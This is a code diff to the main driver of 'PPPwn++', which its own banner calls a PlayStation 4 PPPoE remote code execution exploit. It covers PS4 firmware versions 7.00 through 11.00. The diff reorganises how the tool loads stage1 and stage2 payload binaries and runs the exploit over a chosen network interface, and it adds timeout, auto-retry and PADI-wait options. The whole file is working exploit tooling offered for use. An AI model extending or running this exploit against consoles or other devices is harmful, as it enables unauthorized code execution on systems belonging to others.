@@ -5,8 +5,11 @@
 #include <string>
 #include <PcapLiveDeviceList.h>
 #include <clipp.h>
+
 #if defined(__APPLE__)
+
 #include <SystemConfiguration/SystemConfiguration.h>
+
 #endif
 
 #include "exploit.h"
@@ -16,28 +19,6 @@
 
 #include <windows.h>
 #include <mmsystem.h>
-
-void cleanup(int ret) {
-    exit(ret);
-}
-
-#else
-
-#include <csignal>
-#include <unistd.h>
-
-static pid_t pid;
-
-void cleanup(int ret) {
-    if (pid > 0) kill(pid, SIGKILL);
-    exit(ret);
-}
-
-static void signal_handler(int sig_num) {
-    signal(sig_num, signal_handler);
-    cleanup(sig_num);
-}
-
 #endif
 
 std::vector<uint8_t> readBinary(const std::string &filename) {
@@ -57,22 +38,6 @@ std::vector<uint8_t> readBinary(const std::string &filename) {
     }
 
     return buffer;
-}
-
-int startExploit(const std::string &interface, enum FirmwareVersion fw,
-                 const std::string &stage1, const std::string &stage2,
-                 bool retry) {
-    Exploit exploit;
-    if (exploit.setFirmwareVersion(fw)) cleanup(1);
-    if (exploit.setInterface(interface)) cleanup(1);
-    auto stage1_data = readBinary(stage1);
-    if (stage1_data.empty()) cleanup(1);
-    auto stage2_data = readBinary(stage2);
-    if (stage2_data.empty()) cleanup(1);
-    exploit.setStage1(std::move(stage1_data));
-    exploit.setStage2(std::move(stage2_data));
-    exploit.setAutoRetry(retry);
-    return exploit.run();
 }
 
 void listInterfaces() {
@@ -141,21 +106,26 @@ enum FirmwareVersion getFirmwareOffset(int fw) {
     return fw_choices[fw];
 }
 
-#define SUPPORTED_FIRMWARE "{700,701,702,750,751,755,800,801,803,850,852,900,903,904,950,951,960,1000,1001,1050,1070,1071,1100}"
+#define SUPPORTED_FIRMWARE "{700,701,702,750,751,755,800,801,803,850,852,900,903,904,950,951,960,1000,1001,1050,1070,1071,1100} (default: 1100)"
 
 int main(int argc, char *argv[]) {
     using namespace clipp;
     std::cout << "[+] PPPwn++ - PlayStation 4 PPPoE RCE by theflow" << std::endl;
     std::string interface, stage1 = "stage1/stage1.bin", stage2 = "stage2/stage2.bin";
     int fw = 1100;
+    int timeout = 0;
     bool retry = false;
+    bool no_wait_padi = false;
 
     auto cli = (
             ("network interface" % required("-i", "--interface") & value("interface", interface), \
             SUPPORTED_FIRMWARE % option("--fw") & integer("fw", fw), \
-            "stage1 binary" % option("--stage1") & value("STAGE1", stage1), \
-            "stage2 binary" % option("--stage2") & value("STAGE2", stage2), \
-            "automatically retry when fails" % option("-a", "--auto-retry").set(retry)
+            "stage1 binary (default: stage1/stage1.bin)" % option("-s1", "--stage1") & value("STAGE1", stage1), \
+            "stage2 binary (default: stage2/stage2.bin)" % option("-s2", "--stage2") & value("STAGE2", stage2), \
+            "timeout in seconds for ps4 response, 0 means always wait (default: 0)" %
+            option("-t", "--timeout") & integer("seconds", timeout), \
+            "automatically retry when fails or timeout" % option("-a", "--auto-retry").set(retry), \
+            "don't wait one more PADI before starting" % option("-nw", "--no-wait-padi").set(no_wait_padi)
             ) | \
             "list interfaces" % command("list").call(listInterfaces)
     );
@@ -174,29 +144,35 @@ int main(int argc, char *argv[]) {
     }
 
     std::cout << "[+] args: interface=" << interface << " fw=" << fw << " stage1=" << stage1 << " stage2=" << stage2
-              << " auto-retry=" << (retry ? "on" : "off") << std::endl;
+              << " timeout=" << timeout
+              << " auto-retry=" << (retry ? "on" : "off") << " no-wait-padi=" << (no_wait_padi ? "on" : "off")
+              << std::endl;
 
-    int ret = 0;
 #ifdef _WIN32
-    // todo run LcpEchoHandler
     timeBeginPeriod(1);
-    ret = startExploit(interface, offset, stage1, stage2, retry);
-    timeEndPeriod(1);
-#else
-    pid = fork();
-    if (pid < 0) {
-        std::cerr << "[-] Cannot run LcpEchoHandler" << std::endl;
-    } else if (pid == 0) {
-        LcpEchoHandler lcp_echo_handler(interface);
-        lcp_echo_handler.run();
-    } else {
-        signal(SIGPIPE, SIG_IGN);
-        signal(SIGINT, signal_handler);
-        signal(SIGTERM, signal_handler);
-        signal(SIGKILL, signal_handler);
-        ret = startExploit(interface, offset, stage1, stage2, retry);
-        kill(pid, SIGKILL);
-    }
+    std::atexit([](){
+        timeEndPeriod(1);
+    });
 #endif
-    return ret;
+
+    Exploit exploit;
+    if (exploit.setFirmwareVersion((FirmwareVersion) fw)) return 1;
+    if (exploit.setInterface(interface)) return 1;
+    auto stage1_data = readBinary(stage1);
+    if (stage1_data.empty()) return 1;
+    auto stage2_data = readBinary(stage2);
+    if (stage2_data.empty()) return 1;
+    exploit.setStage1(std::move(stage1_data));
+    exploit.setStage2(std::move(stage2_data));
+    exploit.setTimeout(timeout);
+    exploit.setWaitPADI(!no_wait_padi);
+
+    if (!retry) return exploit.run();
+
+    while (exploit.run() != 0) {
+        exploit.ppp_byebye();
+        std::cerr << "[*] Retry after 5s..." << std::endl;
+        std::this_thread::sleep_for(std::chrono::seconds(5));
+    }
+    return 0;
 }
